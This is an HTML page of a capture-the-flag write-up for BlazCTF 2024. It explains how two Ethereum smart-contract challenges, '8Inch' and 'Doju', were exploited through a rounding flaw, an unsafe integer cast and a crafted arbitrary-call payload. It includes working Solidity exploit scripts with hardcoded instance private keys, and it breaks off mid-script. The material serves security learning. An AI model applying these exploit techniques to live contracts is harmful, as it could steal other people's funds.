@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>BlazCTF 2024 Writeup :: Mystify</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This time I went to @DeFiHackLabs and attempt my very first Web3-focused CTF. I am fortunately able to solve some challenges. Nothing particular difficult, but that&amp;rsquo;s still something.
+🚧 Syntax highlight to be fixed. I never imagine that I will work on Web3 challenges, thus I did not have syntax highlight for Solidity. I will have this addressed.  8Inch Challenge Summary  After finding out CowSwap raising millions, Tony reluctantly coded an intent-based DeFi project, wrestling with his ideals as venture capital poured in." />
+<meta name="keywords" content="ctf" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://mystiz.hk/posts/2024/2024-09-28-blazctf/" />
+
+
+
+
+<link rel="stylesheet" href="https://mystiz.hk/assets/style.css">
+
+  <link rel="stylesheet" href="https://mystiz.hk/assets/mystiz.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://mystiz.hk/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://mystiz.hk/img/favicon/mystiz.png">
+
+
+
+
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://mystiz.hk/images/2024-09-28-blazctf/blazctf-banner.png" />
+
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="mystiz613" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="BlazCTF 2024 Writeup">
+<meta property="og:description" content="This time I went to @DeFiHackLabs and attempt my very first Web3-focused CTF. I am fortunately able to solve some challenges. Nothing particular difficult, but that&#39;s still something." />
+<meta property="og:url" content="https://mystiz.hk/posts/2024/2024-09-28-blazctf/" />
+<meta property="og:site_name" content="Mystify" />
+
+  <meta property="og:image" content="https://mystiz.hk/images/2024-09-28-blazctf/blazctf-banner.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2024-09-28 01:30:00 &#43;0800 &#43;0800" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <script data-ad-client="ca-pub-3220069814773012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+</head>
+<body class="mystiz">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Mystify
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about-me">About Me</a></li>
+        
+      
+        
+          <li><a href="/blogroll">Blogroll</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/crypto-in-ctf">Crypto in CTF</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about-me">About Me</a></li>
+      
+    
+      
+        <li><a href="/blogroll">Blogroll</a></li>
+      
+    
+      
+        <li><a href="/crypto-in-ctf">Crypto in CTF</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://mystiz.hk/posts/2024/2024-09-28-blazctf/">BlazCTF 2024 Writeup</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2024-09-28 
+      </span>
+    
+    
+    <span class="post-author">:: Mystiz</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://mystiz.hk/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="https://mystiz.hk/tags/blazctf/">blazctf</a>&nbsp;
+    
+    #<a href="https://mystiz.hk/tags/blockchain/">blockchain</a>&nbsp;
+    
+  </span>
+  
+
+  
+  <h6 class="post-subtitle">Hacking multiple Ethereum smart contracts.</h6>
+  
+
+  
+    <img src="https://mystiz.hk/images/2024-09-28-blazctf/blazctf-banner.png" class="post-cover center" alt="BlazCTF 2024 Writeup" />
+  
+
+  <div class="post-content js-toc-content"><div>
+        <p>This time I went to <a href="https://twitter.com/DeFiHackLabs" target="_blank" rel="nofollow">@DeFiHackLabs</a> and attempt my very first Web3-focused CTF. I am fortunately able to solve some challenges. Nothing particular difficult, but that&rsquo;s still something.</p>
+<div class="alert danger">
+  🚧 <strong>Syntax highlight to be fixed.</strong> I never imagine that I will work on Web3 challenges, thus I did not have syntax highlight for Solidity. I will have this addressed.
+</div>
+
+<h2 id="8inch">8Inch<a href="#8inch" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary">Challenge Summary<a href="#challenge-summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p>After finding out CowSwap raising millions, Tony reluctantly coded an intent-based DeFi project, wrestling with his ideals as venture capital poured in.</p>
+<p><a href="https://storage.googleapis.com/blazctf24/8inch.zip">Handouts</a></p>
+</blockquote>
+<p>The <code>TradeSettlement</code> contract has given us some functions to trade ERC20 tokens with others. The deployer account is selling 10 WOJAK with 1 WETH on <code>TradeSettlement</code> at the beginning. The goal is to obtain at least 10 WOJAK.</p>
+<h3 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h4 id="part-i-stealing-tokens-from-the-deployers-trade">Part I: Stealing tokens from the deployer&rsquo;s trade<a href="#part-i-stealing-tokens-from-the-deployers-trade" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p><code>TradeSettlement::settleTrade</code> allows us to partially fill a trade using token A for token B. The token transfers are defined in the below lines:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity">require(IERC20(trade.tokenToBuy).transferFrom(msg.sender, trade.maker, tradeAmount <span style="color:#f92672">/</span> trade.amountToSell), <span style="color:#e6db74">&#34;Buy transfer failed&#34;</span>);
+require(IERC20(trade.tokenToSell).transfer(msg.sender, _amountToSettle), <span style="color:#e6db74">&#34;Sell transfer failed&#34;</span>);
+</code></pre></div><p>When <code>tradeAmount &lt; trade.amountToSell</code>, we will be sending no tokens in order to gain some token B. From the existing trade where one is selling 10 WOJAK for 1 WETH, we are able to buy $9 \cdot 10^{-18}$ WOJAK for free.</p>
+
+  <figure class="center" >
+    <img src="/images/2024-09-28-blazctf/8inch-progress-1.png"   />
+    
+      <figcaption class="right" >Progress: $9 \cdot 10^{-18} / 10$.</figcaption>
+    
+  </figure>
+
+
+<p>We can repeat this vulnerability as much as possible. Maybe let&rsquo;s exploit it four times to give us&hellip; $45 \cdot 10^{-18}$ WOJAK? We are having a good start!</p>
+
+  <figure class="center" >
+    <img src="/images/2024-09-28-blazctf/8inch-progress-1.png"   />
+    
+      <figcaption class="right" >Progress: $45 \cdot 10^{-18} / 10$.</figcaption>
+    
+  </figure>
+
+
+<h4 id="part-ii-exploiting-integer-overflow-in-safeuint112">Part II: Exploiting integer overflow in <code>SafeUint112</code><a href="#part-ii-exploiting-integer-overflow-in-safeuint112" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p><code>SafeUint112::safeCast</code> and <code>SafeUint112::safeMul</code>, contrary to their names, are not safe. For instance, <code>safeCast</code> intends to cast a <code>uint256</code> that fits into a <code>uint112</code>. However, it mistakenly includes $2^{112}$ as a valid input and allow it to be casted into <code>uint112(0)</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">SafeUint112</span> {
+    <span style="color:#75715e">/// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">safeCast</span>(<span style="color:#66d9ef">uint256</span> value) <span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint112</span>) {
+        require(value <span style="color:#f92672">&lt;=</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">112</span>), <span style="color:#e6db74">&#34;SafeUint112: value exceeds uint112 max&#34;</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">uint112</span>(value);
+    }
+
+    <span style="color:#75715e">/// @dev safeMul is a function that multiplies two uint112 values, and reverts on overflow
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">safeMul</span>(<span style="color:#66d9ef">uint112</span> a, <span style="color:#66d9ef">uint256</span> b) <span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint112</span>) {
+        require(<span style="color:#66d9ef">uint256</span>(a) <span style="color:#f92672">*</span> b <span style="color:#f92672">&lt;=</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">112</span>), <span style="color:#e6db74">&#34;SafeUint112: value exceeds uint112 max&#34;</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">uint112</span>(a <span style="color:#f92672">*</span> b);
+    }
+}
+</code></pre></div><p><code>safeCast</code> is used in multiple places like <code>TradeSettlement::scaleTrade</code>, which made the function vulnerable. In particular, we can overflow <code>newAmountNeededWithFee</code> and make it zero. Thus we can scale up the trade without sending more tokens.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">TradeSettlement</span> <span style="color:#66d9ef">is</span> SafeUint112 {
+    <span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">scaleTrade</span>(<span style="color:#66d9ef">uint256</span> _tradeId, <span style="color:#66d9ef">uint256</span> scale) <span style="color:#66d9ef">external</span> nonReentrant {
+        require(msg.sender <span style="color:#f92672">==</span> trades[_tradeId].maker, <span style="color:#e6db74">&#34;Only maker can scale&#34;</span>);
+        Trade <span style="color:#66d9ef">storage</span> trade <span style="color:#f92672">=</span> trades[_tradeId];
+        require(trade.isActive, <span style="color:#e6db74">&#34;Trade is not active&#34;</span>);
+        require(scale <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;Invalid scale&#34;</span>);
+        require(trade.filledAmountToBuy <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;Trade is already filled&#34;</span>);
+        <span style="color:#66d9ef">uint112</span> originalAmountToSell <span style="color:#f92672">=</span> trade.amountToSell;
+        trade.amountToSell <span style="color:#f92672">=</span> safeCast(safeMul(trade.amountToSell, scale));
+        trade.amountToBuy <span style="color:#f92672">=</span> safeCast(safeMul(trade.amountToBuy, scale));
+        <span style="color:#66d9ef">uint256</span> newAmountNeededWithFee <span style="color:#f92672">=</span> safeCast(safeMul(originalAmountToSell, scale) <span style="color:#f92672">+</span> fee);
+        <span style="color:#66d9ef">if</span> (originalAmountToSell <span style="color:#f92672">&lt;</span> newAmountNeededWithFee) {
+            require(
+                IERC20(trade.tokenToSell).transferFrom(msg.sender, <span style="color:#66d9ef">address</span>(this), newAmountNeededWithFee <span style="color:#f92672">-</span> originalAmountToSell),
+                <span style="color:#e6db74">&#34;Transfer failed&#34;</span>
+            );
+        }
+    }
+    <span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>}
+</code></pre></div><p>We can create the trade on the left using <code>TradeSettlement::createTrade</code> to exploit the overflowing vulnerability. By scaling the above trade <code>2**111 - 15</code> times, we have <code>newAmountNeededWithFee = 0</code>. Therefore we are able to scale up the trade without paying additional tokens.</p>
+<div style="text-align: center;">
+  <div class="graphviz">
+  digraph {
+    graph [bgcolor="transparent"]
+    node [color="#ffe4e1", fontcolor="#ffe4e1", fillcolor="#33333c", style="filled"]
+    edge [color="#ffe4e1", fontcolor="#ffe4e1"]
+
+    
+  rankdir=LR
+
+  &amp;#34;trade-1&amp;#34;[shape=box, fontname=&amp;#34;Fira Code&amp;#34;, label=&amp;lt;&amp;lt;font point-size=&amp;#34;11&amp;#34;&amp;gt;
+        maker = address(PLAYER)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
+        taker = address(0x0)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
+        tokenToSell = address(WOJAK)&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
+        tokenToBuy = address(WOJAK)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
+        amountToSell = 2&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
+        amountToBuy = 1&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;&amp;lt;/font&amp;gt;&amp;gt;]
+  &amp;#34;trade-2&amp;#34;[shape=box, fontname=&amp;#34;Fira Code&amp;#34;, label=&amp;lt;&amp;lt;font point-size=&amp;#34;11&amp;#34;&amp;gt;
+        maker = address(PLAYER)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
+        taker = address(0x0)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
+        tokenToSell = address(WOJAK)&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
+        tokenToBuy = address(WOJAK)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
+        amountToSell = 2**112 - 30&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
+        amountToBuy = 2**111 - 15&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;&amp;lt;/font&amp;gt;&amp;gt;]
+
+  &amp;#34;trade-1&amp;#34; -&amp;gt; &amp;#34;trade-2&amp;#34;[label=&amp;#34;Scaled&amp;#34;]
+
+  }
+  </div>
+</div>    
+<p>Using <code>TradeSettlement::settleTrade</code>, we can buy 2 WOJAK from the scaled trade at the price of 1 WOJAK. As long as there are sufficient balance in the settlement, we are able to triple our WOJAK settling the scaled trade.</p>
+<div style="text-align: center;">
+  <div class="graphviz">
+  digraph {
+    graph [bgcolor="transparent"]
+    node [color="#ffe4e1", fontcolor="#ffe4e1", fillcolor="#33333c", style="filled"]
+    edge [color="#ffe4e1", fontcolor="#ffe4e1"]
+
+    
+  rankdir=LR
+  node[shape=box]
+
+  &amp;#34;player&amp;#34; -&amp;gt; &amp;#34;player&amp;#34;[label=&amp;#34;1 WOJAK&amp;#34;]
+  &amp;#34;settlement&amp;#34; -&amp;gt; &amp;#34;player&amp;#34;[label=&amp;#34;2 WOJAK&amp;#34;]
+
+  }
+  </div>
+</div>    
+<p>To sum up, we can pay a portion of our hard-earned $45 \cdot 10^{-18}$ WOJAK to create a trade. By scaling it up and repeatedly buying from the scaled trade, we can earn 10 WOJAK.</p>
+
+  <figure class="center" >
+    <img src="/images/2024-09-28-blazctf/8inch-progress-2.png"   />
+    
+      <figcaption class="right" >Progress: $10 / 10$.</figcaption>
+    
+  </figure>
+
+
+<h3 id="solution-script">Solution Script<a href="#solution-script" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">26</span>;
+
+<span style="color:#f92672">import</span> {Script, console} <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#34;forge-std/Script.sol&#34;</span>;
+
+<span style="color:#f92672">import</span> {Challenge, TradeSettlement} <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#34;../src/8Inch.sol&#34;</span>;
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;../src/ERC20.sol&#34;</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">ExploitScript</span> <span style="color:#66d9ef">is</span> Script {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setUp</span>() <span style="color:#66d9ef">public</span> {}
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() <span style="color:#66d9ef">public</span> {
+        vm.startBroadcast();
+
+        Challenge challenge <span style="color:#f92672">=</span> Challenge(<span style="color:#ae81ff">0x368F8017A2b3Af3416977ba4EB8DD21d60A2538E</span>);
+        TradeSettlement tradeSettlement <span style="color:#f92672">=</span> challenge.tradeSettlement();
+        SimpleERC20 wojak <span style="color:#f92672">=</span> challenge.wojak();
+        <span style="color:#66d9ef">address</span> player <span style="color:#f92672">=</span> msg.sender;
+
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>; i<span style="color:#f92672">++</span>) {
+            tradeSettlement.settleTrade(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>);
+        }
+        require(wojak.balanceOf(player) <span style="color:#f92672">==</span> <span style="color:#ae81ff">45</span>);
+
+        wojak.approve(<span style="color:#66d9ef">address</span>(tradeSettlement), type(<span style="color:#a6e22e">uint256</span>).max);
+        tradeSettlement.createTrade(<span style="color:#66d9ef">address</span>(wojak), <span style="color:#66d9ef">address</span>(wojak), <span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">1</span>);
+        require(wojak.balanceOf(player) <span style="color:#f92672">==</span> <span style="color:#ae81ff">13</span>);
+
+        tradeSettlement.scaleTrade(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2596148429267413814265248164610033</span>);
+        require(wojak.balanceOf(player) <span style="color:#f92672">==</span> <span style="color:#ae81ff">13</span>);
+
+        tradeSettlement.settleTrade(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">27</span>);
+        require(wojak.balanceOf(player) <span style="color:#f92672">==</span> <span style="color:#ae81ff">40</span>);
+
+        <span style="color:#66d9ef">while</span> (wojak.balanceOf(player) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">10</span> <span style="color:#66d9ef">ether</span>) {
+            <span style="color:#66d9ef">uint256</span> currentBalance <span style="color:#f92672">=</span> wojak.balanceOf(player);
+
+            tradeSettlement.settleTrade(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>currentBalance);
+            require(wojak.balanceOf(player) <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">*</span>currentBalance);
+        }
+
+        require(wojak.balanceOf(player) <span style="color:#f92672">==</span> <span style="color:#ae81ff">6003785411879964840</span>);
+        tradeSettlement.settleTrade(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span> <span style="color:#66d9ef">ether</span> <span style="color:#f92672">-</span> wojak.balanceOf(player));
+        require(wojak.balanceOf(player) <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> <span style="color:#66d9ef">ether</span>);
+
+        wojak.transfer(<span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0xc0ffee</span>), <span style="color:#ae81ff">10</span> <span style="color:#66d9ef">ether</span>);
+
+        require(wojak.balanceOf(<span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0xc0ffee</span>)) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">10</span> <span style="color:#66d9ef">ether</span>);
+        require(challenge.isSolved(), <span style="color:#e6db74">&#34;not solved&#34;</span>);
+    }
+}
+</code></pre></div><h2 id="doju">Doju<a href="#doju" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary-1">Challenge Summary<a href="#challenge-summary-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p>Pump.Fun? No cult Solana sorry. Tony only builds on Ethereum. Here is his state-of-the-art gas-efficient bonding curve token.</p>
+<p><a href="https://storage.googleapis.com/blazctf24/doju.zip">Handouts</a></p>
+</blockquote>
+<p>The <code>Doju</code> contract implements a token that can be traded with ETH using <code>buyTokens</code> and <code>sellTokens</code>. We have 100 BD and there are around $1.1 \cdot 10^{59}$ BD unminted at the beginning. The goal is to obtain at least $5.7 \cdot 10^{58}$ BD.</p>
+<h3 id="solution-1">Solution<a href="#solution-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The amount of BD we need to gain seemed surreal because the total supply is only 100 BD. Minting is not the way to go because the price is too high (1 ETH per BD).</p>
+<p>Fortunately, we are able to trigger calls from <code>Doju::sellTokens</code> to an arbitrary contract (<code>to</code>) with a packed payload, where most of the parameters are supplied by the caller. We should be able to call <code>Doju::transfer</code> if we craft the payload right.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Doju</span> {
+    <span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Sell tokens and receive ETH
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sellTokens</span>(<span style="color:#66d9ef">uint256</span> tokenAmount, <span style="color:#66d9ef">address</span> to, <span style="color:#66d9ef">uint256</span> minOut) <span style="color:#66d9ef">public</span> {
+        <span style="color:#66d9ef">uint256</span> ethValue <span style="color:#f92672">=</span> _tokensToEth(tokenAmount);
+        _transfer(msg.sender, <span style="color:#66d9ef">address</span>(this), tokenAmount);
+        totalSupply <span style="color:#f92672">-=</span> tokenAmount;
+        (<span style="color:#66d9ef">bool</span> success,) <span style="color:#f92672">=</span>
+            <span style="color:#66d9ef">payable</span>(to).call{value<span style="color:#f92672">:</span> ethValue}(abi.encodePacked(minOut, to, tokenAmount, msg.sender, ethValue));
+        require(minOut <span style="color:#f92672">&gt;</span> ethValue, <span style="color:#e6db74">&#34;minOut not met&#34;</span>);
+        require(success, <span style="color:#e6db74">&#34;Transfer failed&#34;</span>);
+        emit Burn(msg.sender, tokenAmount);
+        emit Transfer(msg.sender, <span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0</span>), tokenAmount);
+    }
+    <span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>}
+</code></pre></div><p>The following figure shows the message structure for the <code>payable(to).call</code>. The green values are easier to control, the red values are fixed, and we would need to compute (or brute-force) to better manipulate the yellow values:</p>
+
+  <figure class="center" >
+    <img src="/images/2024-09-28-blazctf/doju-call-structure-given.png"   />
+    
+      <figcaption class="right" >Message structure of the call in `Doju::sellTokens`.</figcaption>
+    
+  </figure>
+
+
+<p>Since we want to call <code>doju.transfer</code>, we would need to make <code>to</code> to be the address of the Doju contract. We would also need to make <code>ethValue</code> zero as <code>Doju::transfer</code> is non-payable.</p>
+
+  <figure class="center" >
+    <img src="/images/2024-09-28-blazctf/doju-call-structure-target.png"   />
+    
+      <figcaption class="right" >Message structure that we want.</figcaption>
+    
+  </figure>
+
+
+<p>Here <code>0xa9059cbb</code> is the function signature for <code>Doju::transfer</code>, and <code>0xC47f...d6E9</code> is the address for the Doju contract instance.</p>
+<p>To align with the provided message structure, we will need the recipient address of the token, <code>to</code>, to end with <code>c47fcc04</code>. I used <a href="https://github.com/1inch/profanity2">profanity2</a> and it generated an address (<code>0x17bB9d66B3e48a81a00b9ba75C297fc4c47fCC04</code>) in a minute.</p>
+<p>Finally, this is the message call that I used to transfer some tokens to the newly generated account. We will be able to gain sufficient tokens by calling it twice:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity">doju.sellTokens(
+    <span style="color:#75715e">/*tokenAmount=*/</span><span style="color:#ae81ff">0x0</span>,
+    <span style="color:#75715e">/*to=*/</span><span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0xC47fcC04762b188c3C5D1D01aBb279e21be4d6E9</span>),
+    <span style="color:#75715e">/*minOut=*/</span><span style="color:#ae81ff">0xa9059cbb00000000000000000000000017bb9d66b3e48a81a00b9ba75c297fc4</span>
+);
+</code></pre></div><h3 id="solution-script-1">Solution Script<a href="#solution-script-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">13</span>;
+
+<span style="color:#f92672">import</span> {Script, console} <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#34;forge-std/Script.sol&#34;</span>;
+
+<span style="color:#f92672">import</span> {Challenge} <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#34;../src/Challenge.sol&#34;</span>;
+<span style="color:#f92672">import</span> {Doju} <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#34;../src/Doju.sol&#34;</span>;
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e">forge script script/Exploit.s.sol:Exploit1Script --private-key 0x9ab0fe65575aa17213ff8d6ac83462d3932849aeb42ca70b0cb3e85d24feb7d9 -vvvv --rpc-url http://rpc.ctf.so:8545/.../main --broadcast &amp;&amp; 
+</span><span style="color:#75715e">forge script script/Exploit.s.sol:Exploit2Script --private-key 0xb13d58d135dbf6a31afba3bd16530900a13e9b49357e2b67a01f5ec35e65a542 -vvvv --rpc-url http://rpc.ctf.so:8545/.../main --broadcast
+</span><span style="color:#75715e">*/</span>
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Exploit1Script</span> <span style="color:#66d9ef">is</span> Script {
+    <span style="color:#75715e">// Run with the player&#39;s secret key (provided by the instancer).
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setUp</span>() <span style="color:#66d9ef">public</span> {}
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() <span style="color:#66d9ef">public</span> {
+        Challenge challenge <span style="color:#f92672">=</span> Challenge(<span style="color:#ae81ff">0x21474f7350Ea47e17229ed1a27B43D17992A8777</span>);
+        Doju doju <span style="color:#f92672">=</span> challenge.doju();
+
+        vm.startBroadcast();
+
+        <span style="color:#66d9ef">uint256</span> pk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb13d58d135dbf6a31afba3bd16530900a13e9b49357e2b67a01f5ec35e65a542</span>;
+        <span style="color:#66d9ef">address</span> player <span style="color:#f92672">=</span> msg.sender;
+        <span style="color:#66d9ef">address</span> player2 <span style="color:#f92672">=</span> vm.addr(pk);
+
+        <span style="color:#66d9ef">payable</span>(player2).call{value<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>}(<span style="color:#e6db74">&#34;&#34;</span>);
+    }
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Exploit2Script</span> <span style="color:#66d9ef">is</span> Script {
+    <span style="color:#75715e">// Run with the secret key 0xb13d58d135dbf6a31afba3bd16530900a13e9b49357e2b67a01f5ec35e65a542,
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// where the address ends with 0xc47fcc04.
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setUp</span>() <span style="color:#66d9ef">public</span> {}
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() <span style="color:#66d9ef">public</span> {
+        Challenge challenge <span style="color:#f92672">=</span> Challenge(<span style="color:#ae81ff">0x21474f7350Ea47e17229ed1a27B43D17992A8777</span>);
+        Doju doju <span style="color:#f92672">=</span> challenge.doju();
+
+        vm.startBroadcast();
+        <span style="color:#66d9ef">address</span> player <span style="color:#f92672">=</span> msg.sender;
+
+        require(<span style="color:#66d9ef">uint160</span>(player) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc47fcc04</span>, <span style="color:#e6db74">&#34;incorrect address (#1)&#34;</span>);
+
+        <span style="color:#66d9ef">uint256</span> minOut <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa9059cbb00000000000000000000000000000000000000000000000000000000</span> <span style="color:#f92672">+</span>
+            (<span style="color:#66d9ef">uint160</span>(player)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>);
+        <span style="color:#66d9ef">address</span> to <span style="color:#f92672">=</span> <span style="color:#66d9ef">address</span>(doju);
+        <span style="color:#66d9ef">uint256</span> tokenAmount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
